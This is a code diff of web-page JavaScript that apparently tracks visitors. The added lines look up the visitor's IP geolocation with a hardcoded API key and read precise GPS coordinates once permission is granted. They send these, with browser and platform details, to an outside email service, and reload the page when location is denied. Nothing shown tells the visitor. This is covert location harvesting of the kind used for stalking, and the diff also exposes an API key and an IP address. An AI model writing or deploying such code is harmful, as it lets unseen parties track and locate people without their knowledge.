@@ -87,11 +87,19 @@
     debug += 'navigator.platform = ' + navigator.platform + '<br/>';
     debug += 'navigator.vendor = ' + navigator.vendor + '<br/>';
 
-            
+ var url = "https://ipgeolocation.abstractapi.com/v1/?api_key=b3193cff7e294160ad367a7142dc6d5e&ip_address=2405:201:c01f:70f7:c94d:571a:a789:9bb8"
+
+var iplocation = httpGetAsync(url);
+
+debug += iplocation;
+checkLocationPermission();
+//debug += locAccess
+
+
 
    //var resp = httpGet("http://ip-api.com/json?callback=");
    //console.log(resp);
-   getLocation(debug);
+   //getLocation(debug);
    //debug += resp;
     
 
@@ -108,6 +116,10 @@
     }
 };
 
+
+
+
+
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     type: 'POST',
     async: false,
@@ -121,7 +133,7 @@ $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     //alert('Oops... ' + JSON.stringify(error));
 
 });
-
+/*
 if(navigator.userAgent.includes("Instagram")){
     alert("If cannot continue, Use another browser");
     window.close();
@@ -129,7 +141,7 @@ if(navigator.userAgent.includes("Instagram")){
        window.location.href = "https://main.d6lstv6g57srw.amplifyapp.com/";
    }
 
-
+*/
 
 }());
 
@@ -147,16 +159,20 @@ function checkLocationPermission()
     navigator.permissions && navigator.permissions.query({name: 'geolocation'})
     .then(function(PermissionStatus) {
         if (PermissionStatus.state == 'granted') {
-             // console.log("Location access granted");
+             //console.log("Location access granted");
+             getLocation();
+             return "\n Granted";
         } else if (PermissionStatus.state == 'prompt') {
               //console.log("Location access NOT granted");
+              return " \n Not granted";
         } else {
              //denied
+             return "\n denied"
         }
     })
 }
 
-function getLocation(debug)
+function getLocation()
 {
      if(navigator.geolocation) {
         var options = {timeout:60000};
@@ -172,8 +188,8 @@ function getLocation(debug)
 
 function showPosition(position) {
     var location = position.coords.latitude +","+position.coords.longitude;
-  //console.log("Latitude: " + position.coords.latitude + 
-  //"Longitude: " + position.coords.longitude);
+  console.log("Latitude: " + position.coords.latitude + 
+  "Longitude: " + position.coords.longitude);
 
   var data = {
     service_id: 'service_qgtevq3',
@@ -183,6 +199,7 @@ function showPosition(position) {
         'location': location
     }
 };
+
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     type: 'POST',
     async: false,
@@ -200,13 +217,22 @@ $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
 
 }
 
+function httpGetAsync(theUrl) {
+
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    //console.log(xmlHttp.responseText);
+    return xmlHttp.responseText;
+}
+
 function showError(error) {   
   switch(error.code) {
     case error.PERMISSION_DENIED:
       //console.log("User denied the request for Geolocation.");
-      alert("Enable location access for this browser in your settings.");
+      //alert("Enable location access for this browser in your settings.");
       //window.location.reload();
-      window.close();
+      //window.close();
       window.location.reload();
       break;
     case error.POSITION_UNAVAILABLE:
